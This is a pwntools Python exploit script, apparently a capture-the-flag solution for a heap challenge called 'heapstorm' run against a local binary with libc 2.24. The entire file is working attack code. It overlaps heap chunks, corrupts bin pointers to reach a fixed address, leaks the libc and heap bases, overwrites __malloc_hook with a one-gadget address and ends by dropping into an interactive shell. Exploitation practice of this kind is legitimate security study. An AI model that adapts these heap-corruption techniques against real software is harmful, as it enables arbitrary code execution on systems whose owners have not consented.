from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter("and: ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter("Size: ",str(size))
def edit(idx,size,c):
	cmd(2)
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content: ",c)
def free(idx):
	cmd(3)
	p.sendlineafter("Index: ",str(idx))
def show(idx):
	cmd(4)
	p.sendlineafter("Index: ",str(idx))
p=process('./heapstorm',env={"LD_PRELOAD":"./libc-2.24.so"})
add(0x500)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0,0x18-0xc,"A"*(0x18-0xc))
add(0x88)#3
add(0x88)#4
free(3)
free(1)
add(0x2d8)#1
add(0x78)#3
add(0x48)#5
aim=0x13370810
add(0x666)#6
edit(4,8*12,p64(0x4a1)*8+p64(0)+p64(aim-0x20+8)+p64(0)+p64(aim-0x20-0x18-5))
edit(5,0x10,p64(0)+p64(0x91))
free(4)
edit(5,0x20,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))

add(0x48)#4

edit(4,0x48-0xc,'\x00'*0x10+p64(0x13377331)+p64(0)+p64(0x13370840)+p64(0x100)+'\x00'*0xc)

show(0)
p.readuntil(": ")
p.read(0x20)
base=(u64(p.read(8))^0x13370800)-(0x00007fae63fa9b78-0x7fae63be5000)-(0x7f55e1876fe0-0x7f55e18a2000)
heap=u64(p.read(8))-0xf8
log.info(hex(base))
log.info(hex(heap))
#
gdb.attach(p,'')
libc=ELF("./libc-2.24.so")
libc.address=base
edit(0,0x88,p64(libc.sym['__malloc_hook'])+p64(0x100)+'\x00'*0x78)
one=0x3f35a+base
edit(2,0x14-0xc,p64(one))
#
add(0x100)
p.interactive()

# fill 0x13377331
